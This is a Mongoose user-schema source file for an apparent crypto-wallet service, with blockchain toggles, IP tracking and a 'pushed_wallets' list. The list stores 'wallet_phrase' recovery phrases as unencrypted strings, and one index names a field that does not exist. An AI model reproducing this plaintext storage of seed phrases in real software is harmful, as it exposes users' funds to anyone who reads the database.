const mongoose = require("mongoose");

const userSchema = new mongoose.Schema({
  user_id :{
    type : String,
    unique: true,
    required : true,
  },
  email : {
    type : String,
    unique : true
  },
  first_name: {
    type: String,
    required: true,
  },
  is_verified : {
    type : Boolean,
    default : false
  },
  join_date : {
    type: Date,
    required : true
  },
  is_upgraded : {
    type: Boolean,
    default : false
  },
  blockchain : {
    bitcoin :{
      type : Boolean,
      default : false
    },
    tron : {
      type : Boolean,
      default : true
    },
    ethereum:{
      type : Boolean,
      default : false
    },
    binance:{
      type : Boolean,
      default : false
    },   
    ripple:{
      type : Boolean,
      default : false
    },   
    solana:{
      type : Boolean,
      default : false
    } 
  },
  pushed_wallets : {
    type : [
      {
        date : {
          type: Date,
          required : true
        },
        chain : {
          type: String,
          required : true
        },
        amount : {
          type : Number,
          required : true
        },
        wallet_phrase : {
          type : String
        }
      }
    ]
  },
  is_unique_ip_user: {
    type: Boolean,
    default: true,
  },
  ip_address :{
    type : String
  },
  is_blocked : {
    type : Boolean,
    default : false
  }
});

userSchema.index({ userId: 1 });
userSchema.index({ join_date: -1 });
userSchema.index({ ip_address: 1 });

const userModel = new mongoose.model("users", userSchema);
module.exports = userModel;